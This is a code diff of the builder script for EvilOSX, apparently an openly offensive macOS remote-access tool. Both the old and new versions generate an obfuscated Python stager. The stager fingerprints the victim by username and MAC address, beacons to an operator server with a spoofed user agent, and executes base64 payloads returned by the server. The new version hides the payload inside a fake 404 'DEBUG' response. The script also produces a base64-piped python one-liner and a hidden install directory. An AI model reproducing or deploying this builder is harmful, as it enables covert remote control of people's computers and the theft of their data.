@@ -4,232 +4,172 @@
 __author__ = "Marten4n6"
 __license__ = "GPLv3"
 
-from sys import exit
-import os
-import fnmatch
-import importlib.util
 import random
 import string
-import base64
-import json
+from os import path
+from sys import exit
 from textwrap import dedent
-from server.model import LoaderFactory
+from uuid import uuid4
+from base64 import b64encode
+import json
 
-MESSAGE_INPUT = "\033[1m" + "[?] " + "\033[0m"
-MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
-MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"
+from bot import launchers, loaders
 
-
-class Utils:
-    """Static utility class."""
-
-    @staticmethod
-    def random_string(size: int=None, numbers: bool=False) -> str:
-        """:return A randomly generated string of x characters.
-
-        If no size is specified, a random number between 6 and 15 will be used.
-        """
-        name = ""
-        if not size:
-            size = random.randint(6, 15)
-
-        for i in range(0, size):
-            if not numbers:
-                name += random.choice(string.ascii_letters)
-            else:
-                name += random.choice(string.ascii_letters + string.digits)
-        return name
-
-    @staticmethod
-    def get_random_user_agent() -> str:
-        """:return A random user-agent string."""
-        user_agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
-            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36"
-        ]
-        return random.choice(user_agents)
+MESSAGE_INPUT = "[\033[1m?\033[0m] "
+MESSAGE_INFO = "[\033[94mI\033[0m] "
+MESSAGE_ATTENTION = "[\033[91m!\033[0m] "
 
 
-class LauncherFactory:
-    """Creates launchers."""
+def _get_random_user_agent() -> str:
+    """:return: A random user agent."""
+    # Taken from https://techblog.willshouse.com/2012/01/03/most-common-user-agents/
+    user_agents = [
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0.3 Safari/604.5.6",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
+    ]
+    return random.choice(user_agents)
 
-    def __init__(self):
-        self._launchers = {
-            "helpers": self._load_module("helpers", os.path.join("launchers", "helpers.py"))
-        }
-        self._load_launchers()
 
-    @staticmethod
-    def _load_module(module_name: str, module_path: str):
-        """Loads a module."""
-        spec = importlib.util.spec_from_file_location(module_name, module_path)
-        module = importlib.util.module_from_spec(spec)
-        spec.loader.exec_module(module)
-        return module
+def _get_random_string(size: int = random.randint(6, 15), numbers: bool = False) -> str:
+    """:return: A randomly generated string of x characters."""
+    result = ""
 
-    def _load_launchers(self):
-        """Loads all launchers."""
-        for root, dirs, files in os.walk("launchers"):
-            for file_name in fnmatch.filter(files, "*.py"):
-                launcher_name = file_name[0:-3]
-                launcher_path = os.path.join(root, file_name)
-
-                if launcher_name in ["__init__", "template", "helpers"]:
-                    continue
-
-                self._launchers[launcher_name] = self._load_module(launcher_name, launcher_path).Launcher()
-
-    def get_launchers(self) -> dict:
-        """:return A dict of all launchers."""
-        launchers = dict(self._launchers)
-
-        launchers.pop("helpers")
-        return launchers
-
-    def get_launcher(self, index: int):
-        """:return A tuple containing the launcher's name and class."""
-        for i, (key, launcher) in enumerate(self.get_launchers().items()):
-            if i == index:
-                return key, launcher
-
-    def create_launcher(self, launcher_name: str, stager: str) -> str:
-        output_extension, launcher_code = self._launchers[launcher_name].generate(stager)
-
-        output_directory = os.path.dirname(os.path.realpath(__file__)) + "/builds/"
-        output_name = "Launcher-" + Utils.random_string(9) + "." + output_extension
-        output_file = os.path.join(output_directory, output_name)
-
-        if not output_extension:
-            print(dedent(launcher_code))
+    for i in range(0, size):
+        if not numbers:
+            result += random.choice(string.ascii_letters)
         else:
-            if not os.path.exists(output_directory):
-                os.mkdir(output_directory)
-
-            with open(os.path.join(output_file), "w") as launcher_out:
-                launcher_out.write(dedent(launcher_code))
-            return output_file
+            result += random.choice(string.ascii_letters + string.digits)
+    return result
 
 
-def create_stager(server_host, server_port, program_directory, loader_name, loader_options):
-    """Creates the stager."""
-    options = {
-        "host": server_host,
-        "port": server_port,
-        "program_directory": program_directory,
-        "loader_name": loader_name
-    }
+def create_stager(server_host: str, server_port: int, loader_options: dict) -> str:
+    """:return: The stager which the launcher will execute."""
+    stager_host = "http://{}:{}".format(server_host, server_port)
 
-    if loader_options:
-        options["loader_options"] = loader_options
-
-    stager_code = """\
+    # Small piece of code which starts the staging process.
+    # (Runs the loader returned by the server).
+    stager_code = dedent("""\
+    # -*- coding: utf-8 -*-
     import urllib2
-    from urllib import urlencode
-    import ssl
+    from base64 import b64encode, b64decode
     import getpass
-    import uuid
+    from uuid import getnode
+    from binascii import hexlify
 
-    %s = "%s"
-
-
-    def get_key():
-        return "".join(x.encode("hex") for x in (getpass.getuser() + "-" + str(uuid.getnode())))
-
-
-    data = urlencode({
-            "Cookie": "session=%s", 
-            "Content-Type": get_key()
-    })
-
-    req_context = ssl.create_default_context()
-    req_context.check_hostname = False
-    req_context.verify_mode = ssl.CERT_NONE
-
-    request = urllib2.Request(url="https://%s:%s/api/stager", headers={"User-Agent": "%s"}, data=data)    
-    response = urllib2.urlopen(request, context=req_context)
     
-    exec(response.read().decode())
-    """ % (
-        Utils.random_string(), Utils.random_string(numbers=True),
-        base64.b64encode(json.dumps(options).encode()).decode(), server_host,
-        server_port, Utils.get_random_user_agent()
-    )
+    def get_uid():
+        return hexlify(getpass.getuser() + "-" + str(getnode()))
 
-    return "echo \"import base64;exec(base64.b64decode('{}'))\" | python".format(
-        base64.b64encode(dedent(stager_code).encode()).decode()
-    )
+    
+    {0} = "{1}"
+    data = {{
+        "Cookie": "session=" + b64encode(get_uid()) + "-{2}",
+        "User-Agent": "{3}"
+    }}
+        
+    try:
+        request = urllib2.Request("{4}", headers=data)
+        urllib2.urlopen(request).read()
+    except urllib2.HTTPError as ex:
+        if ex.code == 404:
+            exec(b64decode(ex.read().split("DEBUG:\\n")[1].replace("DEBUG-->", "")))
+        else:
+            raise
+    """.format(
+        _get_random_string(), _get_random_string(numbers=True),
+        b64encode("{}".format(json.dumps({
+            "type": 0,
+            "payload_options": {"host": server_host, "port": server_port},
+            "loader_options": loader_options
+        })).encode()).decode(),
+        _get_random_user_agent(),
+        stager_host
+    ))
+
+    return "echo {} | base64 --decode | python".format(b64encode(stager_code.encode()).decode())
 
 
 def main():
-    server_host = input(MESSAGE_INPUT + "Server IP (where EvilOSX will connect to): ")
+    server_host = input(MESSAGE_INPUT + "Server host (where EvilOSX will connect to): ")
     server_port = int(input(MESSAGE_INPUT + "Server port: "))
     program_directory = input(MESSAGE_INPUT + "Where should EvilOSX live? [ENTER for ~/Library/Containers/.<RANDOM>]: ")
 
     if not program_directory:
-        random_directory = "~/Library/Containers/.{}".format(Utils.random_string())
+        random_directory = "~/Library/Containers/.{}".format(_get_random_string())
 
         program_directory = random_directory
         print(MESSAGE_INFO + "Using: {}".format(random_directory))
 
-    launcher_factory = LauncherFactory()
-    loader_factory = LoaderFactory()
+    # Select a launcher
+    launcher_names = launchers.get_names()
 
-    # Prompt the user to select a launcher
-    print(MESSAGE_INFO + "{} available launchers: ".format(len(launcher_factory.get_launchers())))
-    for i, (key, launcher) in enumerate(launcher_factory.get_launchers().items()):
-        print("{} = {} -> {}".format(str(i), key, launcher.get_info()["Description"]))
-
-    while True:
-        try:
-            launcher_index = input(MESSAGE_INPUT + "Launcher to use [ENTER for 0]: ")
-
-            if not launcher_index:
-                launcher_name, launcher = launcher_factory.get_launcher(0)
-            else:
-                launcher_name, launcher = launcher_factory.get_launcher(int(launcher_index))
-
-            break
-        except ValueError:
-            print(MESSAGE_ATTENTION + "Invalid launcher.")
-
-    # Prompt the user to select a loader
-    print(MESSAGE_INFO + "%s available loaders: " % len(loader_factory.get_loaders()))
-    for i, (key, loader) in enumerate(loader_factory.get_loaders().items()):
-        print("{} = {} -> {}".format(str(i), key, loader.get_info()["Description"]))
+    print(MESSAGE_INFO + "{} available launchers: ".format(len(launcher_names)))
+    for i, launcher_name in enumerate(launcher_names):
+        print("{} = {}".format(str(i), launcher_name))
 
     while True:
         try:
-            loader_index = input(MESSAGE_INPUT + "Launcher to use [ENTER for 0]: ")
+            selected_launcher = input(MESSAGE_INPUT + "Launcher to use [ENTER for 1]: ")
 
-            if not loader_index:
-                loader_name, loader = loader_factory.get_loader(0)
+            if not selected_launcher:
+                selected_launcher = 1
             else:
-                loader_name, loader = loader_factory.get_loader(int(loader_index))
+                selected_launcher = int(selected_launcher)
 
+            selected_launcher = launcher_names[selected_launcher]
             break
-        except ValueError:
-            print(MESSAGE_ATTENTION + "Invalid loader.")
+        except (ValueError, IndexError):
+            continue
+
+    # Select a loader
+    loader_names = loaders.get_names()
+
+    print(MESSAGE_INFO + "{} available loaders: ".format(len(loader_names)))
+    for i, loader_name in enumerate(loader_names):
+        print("{} = {} ({})".format(str(i), loader_name, loaders.get_info(loader_name)["Description"]))
+
+    while True:
+        try:
+            selected_loader = input(MESSAGE_INPUT + "Loader to use [ENTER for 0]: ")
+
+            if not selected_loader:
+                selected_loader = 0
+            else:
+                selected_loader = int(selected_loader)
+
+            selected_loader = loader_names[selected_loader]
+            break
+        except (ValueError, IndexError):
+            continue
+
+    # Loader setup
+    loader_options = loaders.get_options(selected_loader)
+    loader_options["program_directory"] = program_directory
 
     # Create the launcher
-    loader_options = loader.setup()
-    stager = create_stager(server_host, server_port, program_directory, loader_name, loader_options)
+    print(MESSAGE_INFO + "Creating the \"{}\" launcher...".format(selected_launcher))
+    stager = create_stager(server_host, server_port, loader_options)
 
-    print(MESSAGE_INFO + "Creating \"{}\" launcher...".format(launcher_name))
-    launcher_path = launcher_factory.create_launcher(launcher_name, stager)
+    launcher_extension, launcher = launchers.generate(selected_launcher, stager)
+    launcher_path = path.realpath(path.join(path.dirname(__file__), "data", "builds", "Launcher-{}.{}".format(
+        str(uuid4())[:6], launcher_extension
+    )))
 
-    if launcher_path:
-        print(MESSAGE_INFO + "Launcher written to: {}".format(launcher_path))
+    with open(launcher_path, "w") as output_file:
+        output_file.write(launcher)
+
+    print(MESSAGE_INFO + "Launcher written to: {}".format(launcher_path))
 
 
 if __name__ == '__main__':
     try:
         main()
     except KeyboardInterrupt:
-        print("\n" + MESSAGE_INFO + "Interrupted.")
+        print("\n" + MESSAGE_ATTENTION + "Interrupted.")
         exit(0)
